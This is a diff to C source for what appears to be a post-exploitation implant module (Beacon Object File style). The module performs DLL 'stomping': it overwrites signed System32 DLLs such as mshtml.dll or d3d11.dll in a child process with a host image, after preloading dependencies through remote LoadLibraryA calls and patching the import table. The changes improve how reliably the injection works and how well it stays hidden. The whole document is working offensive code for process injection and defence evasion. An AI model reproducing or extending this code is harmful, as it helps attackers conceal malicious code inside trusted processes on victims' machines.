@@ -14,12 +14,25 @@
 #define DONT_RESOLVE_DLL_REFERENCES 0x00000001
 #endif
 
-/* Prefer a large, common signed System32 DLL. */
+/*
+ * Victim must be large enough for the host image and must NOT sit in the
+ * dependency chain of host/CLR imports. Stomping crypt32/winhttp/urlmon
+ * breaks later LoadLibrary(ole32/…) which still bind to that module.
+ */
 static const char* PpfStompVictims[] = {
-    "C:\\Windows\\System32\\crypt32.dll",
-    "C:\\Windows\\System32\\winhttp.dll",
-    "C:\\Windows\\System32\\urlmon.dll",
-    "C:\\Windows\\System32\\wininet.dll",
+    "C:\\Windows\\System32\\xpsservices.dll",
+    "C:\\Windows\\System32\\mshtml.dll",
+    "C:\\Windows\\System32\\d3d11.dll",
+    "C:\\Windows\\System32\\twinapi.appcore.dll",
+    "C:\\Windows\\System32\\Windows.UI.dll",
+    NULL
+};
+
+/* Load into the child before stomping so IAT addresses are valid. */
+static const char* PpfStompHostDeps[] = {
+    "msvcrt.dll",
+    "ole32.dll",
+    "OLEAUT32.dll",
     NULL
 };
 
@@ -520,6 +533,71 @@ static BOOL PpfStompApplyRelocs(
     return TRUE;
 }
 
+static BOOL PpfStompRemoteLoadLibraryA(
+    HANDLE hProcess,
+    const char* path,
+    ULONG_PTR* outBase)
+{
+    SIZE_T pathLen;
+    LPVOID remotePath = NULL;
+    ULONG_PTR pLoadLibraryA;
+    BOOL ok = FALSE;
+
+    *outBase = 0;
+    pLoadLibraryA = (ULONG_PTR)KERNEL32$GetProcAddress(
+        KERNEL32$GetModuleHandleA("kernel32.dll"),
+        "LoadLibraryA");
+    if (!pLoadLibraryA) {
+        return FALSE;
+    }
+
+    pathLen = MSVCRT$strlen(path) + 1;
+    remotePath = PpfStompRemoteAlloc(hProcess, pathLen, PAGE_READWRITE);
+    if (!remotePath || !PpfStompRemoteWrite(hProcess, remotePath, path, pathLen)) {
+        goto done;
+    }
+    if (!PpfStompRemoteCall2(
+            hProcess,
+            pLoadLibraryA,
+            (ULONG_PTR)remotePath,
+            0,
+            outBase,
+            15000) ||
+        *outBase == 0) {
+        goto done;
+    }
+    ok = TRUE;
+
+done:
+    if (remotePath) {
+        KERNEL32$VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
+    }
+    return ok;
+}
+
+/* Map host deps in the child before the victim is stomped. */
+static BOOL PpfStompPreloadDeps(HANDLE hProcess)
+{
+    int i;
+    for (i = 0; PpfStompHostDeps[i] != NULL; i++) {
+        ULONG_PTR base = 0;
+        if (!PpfStompRemoteLoadLibraryA(hProcess, PpfStompHostDeps[i], &base)) {
+            BeaconPrintf(
+                CALLBACK_ERROR,
+                "[!] stomp: preload %s failed (err=%lu)",
+                PpfStompHostDeps[i],
+                KERNEL32$GetLastError());
+            return FALSE;
+        }
+    }
+    return TRUE;
+}
+
+/*
+ * Fill IAT using agent-side GetProcAddress (system DLL bases match the child)
+ * after ensuring each DLL is loaded in the child. Avoids remote GPA stubs and
+ * avoids LoadLibrary after the victim image has been overwritten.
+ */
 static BOOL PpfStompResolveImports(
     HANDLE hProcess,
     ULONG_PTR remoteBase,
@@ -546,12 +624,10 @@ static BOOL PpfStompResolveImports(
         DWORD nameOff;
         char dllName[128];
         ULONG_PTR remoteMod = 0;
-        ULONG_PTR pLoadLibraryA;
+        HMODULE localMod = NULL;
         DWORD oftRva;
         DWORD ftRva;
         DWORD thunkIndex;
-        SIZE_T dllLen;
-        LPVOID remoteDllName = NULL;
 
         MSVCRT$memcpy(
             &imp,
@@ -579,27 +655,35 @@ static BOOL PpfStompResolveImports(
             }
         }
 
-        pLoadLibraryA = (ULONG_PTR)KERNEL32$GetProcAddress(
-            KERNEL32$GetModuleHandleA("kernel32.dll"),
-            "LoadLibraryA");
-        dllLen = MSVCRT$strlen(dllName) + 1;
-        remoteDllName = PpfStompRemoteAlloc(hProcess, dllLen, PAGE_READWRITE);
-        if (!remoteDllName ||
-            !PpfStompRemoteWrite(hProcess, remoteDllName, dllName, dllLen) ||
-            !PpfStompRemoteCall2(
-                hProcess,
-                pLoadLibraryA,
-                (ULONG_PTR)remoteDllName,
-                0,
-                &remoteMod,
-                15000) ||
-            remoteMod == 0) {
-            if (remoteDllName) {
-                KERNEL32$VirtualFreeEx(hProcess, remoteDllName, 0, MEM_RELEASE);
-            }
+        localMod = KERNEL32$GetModuleHandleA(dllName);
+        if (!localMod) {
+            localMod = KERNEL32$LoadLibraryA(dllName);
+        }
+        if (!localMod) {
+            BeaconPrintf(
+                CALLBACK_ERROR,
+                "[!] stomp: local LoadLibrary(%s) failed (err=%lu)",
+                dllName,
+                KERNEL32$GetLastError());
             return FALSE;
         }
-        KERNEL32$VirtualFreeEx(hProcess, remoteDllName, 0, MEM_RELEASE);
+
+        if (!PpfStompRemoteLoadLibraryA(hProcess, dllName, &remoteMod)) {
+            BeaconPrintf(
+                CALLBACK_ERROR,
+                "[!] stomp: remote LoadLibrary(%s) failed",
+                dllName);
+            return FALSE;
+        }
+        if (remoteMod != (ULONG_PTR)localMod) {
+            BeaconPrintf(
+                CALLBACK_ERROR,
+                "[!] stomp: %s base mismatch local=%p remote=%p",
+                dllName,
+                (void*)localMod,
+                (void*)remoteMod);
+            return FALSE;
+        }
 
         oftRva = imp.OriginalFirstThunk ? imp.OriginalFirstThunk : imp.FirstThunk;
         ftRva = imp.FirstThunk;
@@ -609,6 +693,7 @@ static BOOL PpfStompResolveImports(
             ULONG_PTR entry;
             ULONG_PTR fn = 0;
             ULONG_PTR iatAddr;
+            FARPROC localFn = NULL;
 
             entryOff = PpfStompRvaToOffset(
                 pe, peLen, oftRva + thunkIndex * sizeof(ULONG_PTR));
@@ -621,7 +706,8 @@ static BOOL PpfStompResolveImports(
             }
 
             if (IMAGE_SNAP_BY_ORDINAL64(entry)) {
-                return FALSE;
+                localFn = KERNEL32$GetProcAddress(
+                    localMod, (LPCSTR)(ULONG_PTR)IMAGE_ORDINAL64(entry));
             } else {
                 DWORD ibnOff = PpfStompRvaToOffset(pe, peLen, (DWORD)entry);
                 IMAGE_IMPORT_BY_NAME* ibn;
@@ -629,14 +715,28 @@ static BOOL PpfStompResolveImports(
                     return FALSE;
                 }
                 ibn = (IMAGE_IMPORT_BY_NAME*)(pe + ibnOff);
-                if (!PpfStompRemoteGetProc(
-                        hProcess, remoteMod, (const char*)ibn->Name, &fn)) {
+                localFn = KERNEL32$GetProcAddress(localMod, (LPCSTR)ibn->Name);
+                if (!localFn) {
+                    BeaconPrintf(
+                        CALLBACK_ERROR,
+                        "[!] stomp: GetProcAddress(%s!%s) failed",
+                        dllName,
+                        (const char*)ibn->Name);
                     return FALSE;
                 }
             }
+            if (!localFn) {
+                BeaconPrintf(
+                    CALLBACK_ERROR,
+                    "[!] stomp: GetProcAddress(%s#ord) failed",
+                    dllName);
+                return FALSE;
+            }
+            fn = (ULONG_PTR)localFn;
 
             iatAddr = remoteBase + ftRva + thunkIndex * sizeof(ULONG_PTR);
             if (!PpfStompRemoteWrite(hProcess, (LPVOID)iatAddr, &fn, sizeof(fn))) {
+                PpfStompFail("IAT write");
                 return FALSE;
             }
         }
@@ -683,6 +783,11 @@ static BOOL PpfStompHostDll(
     sizeOfHeaders = nt->OptionalHeader.SizeOfHeaders;
     if (sizeOfHeaders > (DWORD)hostDllLen || sizeOfImage < sizeOfHeaders) {
         PpfStompFail("sizes");
+        return FALSE;
+    }
+
+    /* Map real deps first — before the victim image is destroyed. */
+    if (!PpfStompPreloadDeps(hProcess)) {
         return FALSE;
     }
 
